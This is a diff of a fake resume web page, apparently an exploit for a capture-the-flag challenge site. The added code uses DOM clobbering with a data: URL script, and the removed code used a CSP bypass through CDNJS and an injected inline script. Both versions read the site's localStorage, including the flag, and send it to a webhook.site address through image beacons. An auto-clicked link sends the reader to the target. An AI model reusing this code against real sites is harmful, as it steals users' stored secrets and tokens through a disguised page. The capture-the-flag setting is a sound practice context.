@@ -13,9 +13,13 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: DOM Clobbering with CSP-allowed URL -->
+         <!-- CRITICAL: DOM Clobbering with data URL containing flag extraction -->
          <form id="utilsJS">
-             <input name="url" value="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js">
+             <input name="url" value="data:text/javascript,try{const flag=localStorage.getItem('flag');const img=new 
+     Image();img.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/DATA-FLAG?flag='+(flag||'not_found')+'&domain=
+     '+window.location.hostname+'&ts='+Date.now();document.body.appendChild(img);}catch(e){const img=new 
+     Image();img.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/DATA-ERROR?error='+encodeURIComponent(e.messag
+     e);document.body.appendChild(img);}">
          </form>
 
          <div class="resume">
@@ -44,11 +48,13 @@
 
              <div style="text-align: center; margin-top: 40px; color: #666;">
                  <p>Thank you for reviewing my application. I look forward to discussing opportunities.</p>
+                 <p><a href="https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages" target="_blank">View our
+     message board</a></p>
              </div>
          </div>
 
          <script>
-             console.log('CSP BYPASS STRATEGY - CDNJS ALLOWED');
+             console.log('FINAL DATA URL APPROACH');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -58,111 +64,65 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/csp-bypass?' + params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/final-approach?' +
+     params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
              }
 
-             // Create flag extraction code that will execute when lodash loads
-             window.lodashLoadedCallback = function() {
-                 // This will execute when lodash loads on the CTF domain
-                 try {
-                     const flag = localStorage.getItem('flag');
-                     const allStorage = {};
-                     for (let i = 0; i < localStorage.length; i++) {
-                         const key = localStorage.key(i);
-                         allStorage[key] = localStorage.getItem(key);
-                     }
-
-                     // Send via image (CORS-free)
-                     const img = new Image();
-                     const params = new URLSearchParams();
-                     params.append('status', 'FLAG_EXTRACTED_VIA_CDNJS');
-                     params.append('flag', flag || 'not_found');
-                     params.append('all_localStorage', JSON.stringify(allStorage));
-                     params.append('domain', window.location.hostname);
-                     params.append('timestamp', new Date().toISOString());
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/flag-capture?' + params.toString();
-                     document.body.appendChild(img);
-
-                     if (flag) {
-                         // Additional confirmation
-                         const img2 = new Image();
-                         img2.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/SUCCESS?flag=' +
-     encodeURIComponent(flag);
-                         document.body.appendChild(img2);
-                     }
-                 } catch(e) {
-                     const img = new Image();
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/error?msg=' +
-     encodeURIComponent(e.message);
-                     document.body.appendChild(img);
-                 }
-             };
-
              // Send confirmation
              sendWebhook({
-                 status: 'CSP_BYPASS_START',
+                 status: 'FINAL_DATA_URL_APPROACH_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
                  utilsJS_url_value: window.utilsJS?.url?.value || 'not_found',
-                 strategy: 'cdnjs_lodash_with_callback',
+                 data_url_length: window.utilsJS?.url?.value?.length || 0,
                  user_agent: navigator.userAgent
              });
 
-             // Create inline script that will execute flag extraction when on CTF domain
+             // Test the vulnerable function simulation
              setTimeout(() => {
-                 // This script will be injected into the DOM and will execute on CTF domain
-                 const scriptContent = `
                  try {
-                     if (window.location.hostname.includes('jobclobbering') || 
-     window.location.hostname.includes('chal.secjhu.club')) {
-                         const flag = localStorage.getItem('flag');
-                         const allStorage = {};
-                         for (let i = 0; i < localStorage.length; i++) {
-                             const key = localStorage.key(i);
-                             allStorage[key] = localStorage.getItem(key);
-                         }
+                     // Exact vulnerable function logic
+                     let utilJS = window.utilsJS || {};
+                     let script = document.createElement('script');
+                     script.src = utilJS.url;
+                     document.body.appendChild(script);
 
-                         const img = new Image();
-                         const params = new URLSearchParams();
-                         params.append('status', 'FLAG_FROM_INLINE_SCRIPT');
-                         params.append('flag', flag || 'not_found');
-                         params.append('all_localStorage', JSON.stringify(allStorage));
-                         params.append('domain', window.location.hostname);
-                         params.append('timestamp', new Date().toISOString());
-                         img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/inline-flag?' + 
-     params.toString();
-                         document.body.appendChild(img);
-                     }
-                 } catch(e) {}
-                 `;
+                     sendWebhook({
+                         status: 'DATA_URL_SCRIPT_EXECUTED',
+                         timestamp: new Date().toISOString(),
+                         script_src_type: typeof script.src,
+                         script_src_length: script.src.length,
+                         is_data_url: script.src.startsWith('data:'),
+                         success: true
+                     });
 
-                 // Inject the script
-                 const script = document.createElement('script');
-                 script.textContent = scriptContent;
-                 document.head.appendChild(script);
+                 } catch(e) {
+                     sendWebhook({
+                         status: 'DATA_URL_SCRIPT_ERROR',
+                         timestamp: new Date().toISOString(),
+                         error: e.message
+                     });
+                 }
+             }, 1000);
 
-                 sendWebhook({
-                     status: 'INLINE_SCRIPT_INJECTED',
-                     timestamp: new Date().toISOString()
-                 });
-             }, 100);
-
-             // Navigate to CTF domain with inline script ready
+             // Also try clicking the link to the CTF site
              setTimeout(() => {
-                 const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
+                 const link = document.querySelector('a[href*="jobclobbering"]');
+                 if (link) {
+                     sendWebhook({
+                         status: 'CLICKING_CTF_LINK',
+                         timestamp: new Date().toISOString(),
+                         link_href: link.href
+                     });
 
-                 sendWebhook({
-                     status: 'NAVIGATING_WITH_CSP_BYPASS',
-                     timestamp: new Date().toISOString(),
-                     target_url: ctfUrl
-                 });
-
-                 window.location.href = ctfUrl;
-             }, 500);
+                     // Simulate click
+                     link.click();
+                 }
+             }, 2000);
 
          </script>
      </body>
